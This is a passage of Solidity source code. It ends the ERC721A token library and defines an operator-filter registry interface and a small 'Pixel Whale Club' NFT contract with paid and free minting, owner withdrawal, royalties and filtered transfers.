997      * `startTokenId` - the first token ID to be transferred.
998      * `quantity` - the amount to be transferred.
999      *
1000      * Calling conditions:
1001      *
1002      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1003      * transferred to `to`.
1004      * - When `from` is zero, `tokenId` has been minted for `to`.
1005      * - When `to` is zero, `tokenId` has been burned by `from`.
1006      * - `from` and `to` are never both zero.
1007      */
1008     function _afterTokenTransfers(
1009         address from,
1010         address to,
1011         uint256 startTokenId,
1012         uint256 quantity
1013     ) internal virtual {
1014     }
1015 
1016 
1017     /**
1018      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1019      *
1020      * `from` - Previous owner of the given token ID.
1021      * `to` - Target address that will receive the token.
1022      * `tokenId` - Token ID to be transferred.
1023      * `_data` - Optional data to send along with the call.
1024      *
1025      * Returns whether the call correctly returned the expected magic value.
1026      */
1027     function _checkContractOnERC721Received(
1028         address from,
1029         address to,
1030         uint256 tokenId,
1031         bytes memory _data
1032     ) private returns (bool) {
1033         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1034             bytes4 retval
1035         ) {
1036             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1037         } catch (bytes memory reason) {
1038             if (reason.length == 0) {
1039                 revert TransferToNonERC721ReceiverImplementer();
1040             } else {
1041                 assembly {
1042                     revert(add(32, reason), mload(reason))
1043                 }
1044             }
1045         }
1046     }
1047 
1048     // =============================================================
1049     //                        MINT OPERATIONS
1050     // =============================================================
1051 
1052     /**
1053      * @dev Mints `quantity` tokens and transfers them to `to`.
1054      *
1055      * Requirements:
1056      *
1057      * - `to` cannot be the zero address.
1058      * - `quantity` must be greater than 0.
1059      *
1060      * Emits a {Transfer} event for each mint.
1061      */
1062     function _mint(address to, uint256 quantity) internal virtual {
1063         uint256 startTokenId = _currentIndex;
1064         if (quantity == 0) revert MintZeroQuantity();
1065 
1066         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1067 
1068         // Overflows are incredibly unrealistic.
1069         // `balance` and `numberMinted` have a maximum limit of 2**64.
1070         // `tokenId` has a maximum limit of 2**256.
1071         unchecked {
1072             // Updates:
1073             // - `balance += quantity`.
1074             // - `numberMinted += quantity`.
1075             //
1076             // We can directly add to the `balance` and `numberMinted`.
1077             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1078 
1079             // Updates:
1080             // - `address` to the owner.
1081             // - `startTimestamp` to the timestamp of minting.
1082             // - `burned` to `false`.
1083             // - `nextInitialized` to `quantity == 1`.
1084             _packedOwnerships[startTokenId] = _packOwnershipData(
1085                 to,
1086                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1087             );
1088 
1089             uint256 toMasked;
1090             uint256 end = startTokenId + quantity;
1091 
1092             // Use assembly to loop and emit the `Transfer` event for gas savings.
1093             // The duplicated `log4` removes an extra check and reduces stack juggling.
1094             // The assembly, together with the surrounding Solidity code, have been
1095             // delicately arranged to nudge the compiler into producing optimized opcodes.
1096             assembly {
1097                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1098                 toMasked := and(to, _BITMASK_ADDRESS)
1099                 // Emit the `Transfer` event.
1100                 log4(
1101                     0, // Start of data (0, since no data).
1102                     0, // End of data (0, since no data).
1103                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1104                     0, // `address(0)`.
1105                     toMasked, // `to`.
1106                     startTokenId // `tokenId`.
1107                 )
1108 
1109                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1110                 // that overflows uint256 will make the loop run out of gas.
1111                 // The compiler will optimize the `iszero` away for performance.
1112                 for {
1113                     let tokenId := add(startTokenId, 1)
1114                 } iszero(eq(tokenId, end)) {
1115                     tokenId := add(tokenId, 1)
1116                 } {
1117                     // Emit the `Transfer` event. Similar to above.
1118                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1119                 }
1120             }
1121             if (toMasked == 0) revert MintToZeroAddress();
1122 
1123             _currentIndex = end;
1124         }
1125         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1126     }
1127 
1128     /**
1129      * @dev Mints `quantity` tokens and transfers them to `to`.
1130      *
1131      * This function is intended for efficient minting only during contract creation.
1132      *
1133      * It emits only one {ConsecutiveTransfer} as defined in
1134      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1135      * instead of a sequence of {Transfer} event(s).
1136      *
1137      * Calling this function outside of contract creation WILL make your contract
1138      * non-compliant with the ERC721 standard.
1139      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1140      * {ConsecutiveTransfer} event is only permissible during contract creation.
1141      *
1142      * Requirements:
1143      *
1144      * - `to` cannot be the zero address.
1145      * - `quantity` must be greater than 0.
1146      *
1147      * Emits a {ConsecutiveTransfer} event.
1148      */
1149     function _mintERC2309(address to, uint256 quantity) internal virtual {
1150         uint256 startTokenId = _currentIndex;
1151         if (to == address(0)) revert MintToZeroAddress();
1152         if (quantity == 0) revert MintZeroQuantity();
1153         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1154 
1155         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1156 
1157         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1158         unchecked {
1159             // Updates:
1160             // - `balance += quantity`.
1161             // - `numberMinted += quantity`.
1162             //
1163             // We can directly add to the `balance` and `numberMinted`.
1164             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1165 
1166             // Updates:
1167             // - `address` to the owner.
1168             // - `startTimestamp` to the timestamp of minting.
1169             // - `burned` to `false`.
1170             // - `nextInitialized` to `quantity == 1`.
1171             _packedOwnerships[startTokenId] = _packOwnershipData(
1172                 to,
1173                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1174             );
1175 
1176             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1177 
1178             _currentIndex = startTokenId + quantity;
1179         }
1180         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1181     }
1182 
1183     /**
1184      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1185      *
1186      * Requirements:
1187      *
1188      * - If `to` refers to a smart contract, it must implement
1189      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1190      * - `quantity` must be greater than 0.
1191      *
1192      * See {_mint}.
1193      *
1194      * Emits a {Transfer} event for each mint.
1195      */
1196     function _safeMint(
1197         address to,
1198         uint256 quantity,
1199         bytes memory _data
1200     ) internal virtual {
1201         _mint(to, quantity);
1202 
1203         unchecked {
1204             if (to.code.length != 0) {
1205                 uint256 end = _currentIndex;
1206                 uint256 index = end - quantity;
1207                 do {
1208                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1209                         revert TransferToNonERC721ReceiverImplementer();
1210                     }
1211                 } while (index < end);
1212                 // Reentrancy protection.
1213                 if (_currentIndex != end) revert();
1214             }
1215         }
1216     }
1217 
1218     /**
1219      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1220      */
1221     function _safeMint(address to, uint256 quantity) internal virtual {
1222         _safeMint(to, quantity, '');
1223     }
1224 
1225     // =============================================================
1226     //                        BURN OPERATIONS
1227     // =============================================================
1228 
1229     /**
1230      * @dev Equivalent to `_burn(tokenId, false)`.
1231      */
1232     function _burn(uint256 tokenId) internal virtual {
1233         _burn(tokenId, false);
1234     }
1235 
1236     /**
1237      * @dev Destroys `tokenId`.
1238      * The approval is cleared when the token is burned.
1239      *
1240      * Requirements:
1241      *
1242      * - `tokenId` must exist.
1243      *
1244      * Emits a {Transfer} event.
1245      */
1246     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1247         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1248 
1249         address from = address(uint160(prevOwnershipPacked));
1250 
1251         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1252 
1253         if (approvalCheck) {
1254             // The nested ifs save around 20+ gas over a compound boolean condition.
1255             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1256                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1257         }
1258 
1259         _beforeTokenTransfers(from, address(0), tokenId, 1);
1260 
1261         // Clear approvals from the previous owner.
1262         assembly {
1263             if approvedAddress {
1264                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1265                 sstore(approvedAddressSlot, 0)
1266             }
1267         }
1268 
1269         // Underflow of the sender's balance is impossible because we check for
1270         // ownership above and the recipient's balance can't realistically overflow.
1271         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1272         unchecked {
1273             // Updates:
1274             // - `balance -= 1`.
1275             // - `numberBurned += 1`.
1276             //
1277             // We can directly decrement the balance, and increment the number burned.
1278             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1279             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1280 
1281             // Updates:
1282             // - `address` to the last owner.
1283             // - `startTimestamp` to the timestamp of burning.
1284             // - `burned` to `true`.
1285             // - `nextInitialized` to `true`.
1286             _packedOwnerships[tokenId] = _packOwnershipData(
1287                 from,
1288                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1289             );
1290 
1291             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1292             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1293                 uint256 nextTokenId = tokenId + 1;
1294                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1295                 if (_packedOwnerships[nextTokenId] == 0) {
1296                     // If the next slot is within bounds.
1297                     if (nextTokenId != _currentIndex) {
1298                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1299                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1300                     }
1301                 }
1302             }
1303         }
1304 
1305         emit Transfer(from, address(0), tokenId);
1306         _afterTokenTransfers(from, address(0), tokenId, 1);
1307 
1308         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1309         unchecked {
1310             _burnCounter++;
1311         }
1312     }
1313 
1314     // =============================================================
1315     //                     EXTRA DATA OPERATIONS
1316     // =============================================================
1317 
1318     /**
1319      * @dev Directly sets the extra data for the ownership data `index`.
1320      */
1321     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1322         uint256 packed = _packedOwnerships[index];
1323         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1324         uint256 extraDataCasted;
1325         // Cast `extraData` with assembly to avoid redundant masking.
1326         assembly {
1327             extraDataCasted := extraData
1328         }
1329         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1330         _packedOwnerships[index] = packed;
1331     }
1332 
1333     /**
1334      * @dev Called during each token transfer to set the 24bit `extraData` field.
1335      * Intended to be overridden by the cosumer contract.
1336      *
1337      * `previousExtraData` - the value of `extraData` before transfer.
1338      *
1339      * Calling conditions:
1340      *
1341      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1342      * transferred to `to`.
1343      * - When `from` is zero, `tokenId` will be minted for `to`.
1344      * - When `to` is zero, `tokenId` will be burned by `from`.
1345      * - `from` and `to` are never both zero.
1346      */
1347     function _extraData(
1348         address from,
1349         address to,
1350         uint24 previousExtraData
1351     ) internal view virtual returns (uint24) {}
1352 
1353     /**
1354      * @dev Returns the next extra data for the packed ownership data.
1355      * The returned result is shifted into position.
1356      */
1357     function _nextExtraData(
1358         address from,
1359         address to,
1360         uint256 prevOwnershipPacked
1361     ) private view returns (uint256) {
1362         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1363         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1364     }
1365 
1366     // =============================================================
1367     //                       OTHER OPERATIONS
1368     // =============================================================
1369 
1370     /**
1371      * @dev Returns the message sender (defaults to `msg.sender`).
1372      *
1373      * If you are writing GSN compatible contracts, you need to override this function.
1374      */
1375     function _msgSenderERC721A() internal view virtual returns (address) {
1376         return msg.sender;
1377     }
1378 
1379     /**
1380      * @dev Converts a uint256 to its ASCII string decimal representation.
1381      */
1382     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1383         assembly {
1384             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1385             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1386             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1387             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1388             let m := add(mload(0x40), 0xa0)
1389             // Update the free memory pointer to allocate.
1390             mstore(0x40, m)
1391             // Assign the `str` to the end.
1392             str := sub(m, 0x20)
1393             // Zeroize the slot after the string.
1394             mstore(str, 0)
1395 
1396             // Cache the end of the memory to calculate the length later.
1397             let end := str
1398 
1399             // We write the string from rightmost digit to leftmost digit.
1400             // The following is essentially a do-while loop that also handles the zero case.
1401             // prettier-ignore
1402             for { let temp := value } 1 {} {
1403                 str := sub(str, 1)
1404                 // Write the character to the pointer.
1405                 // The ASCII index of the '0' character is 48.
1406                 mstore8(str, add(48, mod(temp, 10)))
1407                 // Keep dividing `temp` until zero.
1408                 temp := div(temp, 10)
1409                 // prettier-ignore
1410                 if iszero(temp) { break }
1411             }
1412 
1413             let length := sub(end, str)
1414             // Move the pointer 32 bytes leftwards to make room for the length.
1415             str := sub(str, 0x20)
1416             // Store the length.
1417             mstore(str, length)
1418         }
1419     }
1420 }
1421 
1422 
1423 interface IOperatorFilterRegistry {
1424     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1425     function register(address registrant) external;
1426     function registerAndSubscribe(address registrant, address subscription) external;
1427     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1428     function unregister(address addr) external;
1429     function updateOperator(address registrant, address operator, bool filtered) external;
1430     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1431     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1432     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1433     function subscribe(address registrant, address registrantToSubscribe) external;
1434     function unsubscribe(address registrant, bool copyExistingEntries) external;
1435     function subscriptionOf(address addr) external returns (address registrant);
1436     function subscribers(address registrant) external returns (address[] memory);
1437     function subscriberAt(address registrant, uint256 index) external returns (address);
1438     function copyEntriesOf(address registrant, address registrantToCopy) external;
1439     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1440     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1441     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1442     function filteredOperators(address addr) external returns (address[] memory);
1443     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1444     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1445     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1446     function isRegistered(address addr) external returns (bool);
1447     function codeHashOf(address addr) external returns (bytes32);
1448 }
1449 
1450 
1451 /**
1452  * @title  OperatorFilterer
1453  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1454  *         registrant's entries in the OperatorFilterRegistry.
1455  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1456  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1457  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1458  */
1459 abstract contract OperatorFilterer {
1460     error OperatorNotAllowed(address operator);
1461 
1462     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1463         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1464 
1465     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1466         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1467         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1468         // order for the modifier to filter addresses.
1469         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1470             if (subscribe) {
1471                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1472             } else {
1473                 if (subscriptionOrRegistrantToCopy != address(0)) {
1474                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1475                 } else {
1476                     OPERATOR_FILTER_REGISTRY.register(address(this));
1477                 }
1478             }
1479         }
1480     }
1481 
1482     modifier onlyAllowedOperator(address from) virtual {
1483         // Check registry code length to facilitate testing in environments without a deployed registry.
1484         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1485             // Allow spending tokens from addresses with balance
1486             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1487             // from an EOA.
1488             if (from == msg.sender) {
1489                 _;
1490                 return;
1491             }
1492             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1493                 revert OperatorNotAllowed(msg.sender);
1494             }
1495         }
1496         _;
1497     }
1498 
1499     modifier onlyAllowedOperatorApproval(address operator) virtual {
1500         // Check registry code length to facilitate testing in environments without a deployed registry.
1501         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1502             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1503                 revert OperatorNotAllowed(operator);
1504             }
1505         }
1506         _;
1507     }
1508 }
1509 
1510 /**
1511  * @title  DefaultOperatorFilterer
1512  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1513  */
1514 abstract contract TheOperatorFilterer is OperatorFilterer {
1515     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1516     address public owner;
1517 
1518     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1519 }
1520 
1521 
1522 contract WhaleClub is ERC721A, TheOperatorFilterer {
1523 
1524     uint256 public maxSupply = 999;
1525 
1526     uint256 public mintPrice = 0.002 ether;
1527 
1528     mapping(address => uint256) private _userForFree;
1529 
1530     mapping(uint256 => uint256) private _userMinted;
1531 
1532     function mint(uint256 amount) compliant(amount) payable public {
1533         require(totalSupply() + amount <= maxSupply);
1534         _safeMint(msg.sender, amount);
1535     }
1536 
1537     modifier compliant(uint256 amount) {
1538         if (msg.value == 0) {
1539             require(amount == 1);
1540             if (totalSupply() > maxSupply / 5) {
1541                 require(_userMinted[block.number] < FreeNum() 
1542                     && _userForFree[tx.origin] < 1 );
1543                 _userForFree[tx.origin]++;
1544                 _userMinted[block.number]++;
1545             }
1546         } else {
1547             require(msg.value >= amount * mintPrice);
1548         }
1549         _;
1550     }
1551 
1552     function privateMint(address addr, uint256 amount) public onlyOwner {
1553         require(totalSupply() + amount <= maxSupply);
1554         _safeMint(addr, amount);
1555     }
1556     
1557     modifier onlyOwner {
1558         require(owner == msg.sender);
1559         _;
1560     }
1561 
1562     constructor() ERC721A("Pixel Whale Club", "Whale") {
1563         owner = msg.sender;
1564     }
1565 
1566     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1567         return string(abi.encodePacked("ipfs://QmfT9TkDf5oJB7C2VoESvqgNf2iasY7dfPCH3Ruwu2jLcY/", _toString(tokenId), ".json"));
1568     }
1569 
1570     function FreeNum() internal returns (uint256){
1571         return (maxSupply - totalSupply()) / 12;
1572     }
1573 
1574     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1575         uint256 royaltyAmount = (_salePrice * 50) / 1000;
1576         return (owner, royaltyAmount);
1577     }
1578 
1579     function withdraw() external onlyOwner {
1580         payable(msg.sender).transfer(address(this).balance);
1581     }
1582 
1583     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1584         super.setApprovalForAll(operator, approved);
1585     }
1586 
1587     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1588         super.approve(operator, tokenId);
1589     }
1590 
1591     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1592         super.transferFrom(from, to, tokenId);
1593     }
1594 
1595     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1596         super.safeTransferFrom(from, to, tokenId);
1597     }
1598 
1599     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1600         public
1601         payable
1602         override
1603         onlyAllowedOperator(from)
1604     {
1605         super.safeTransferFrom(from, to, tokenId, data);
1606     }
1607 }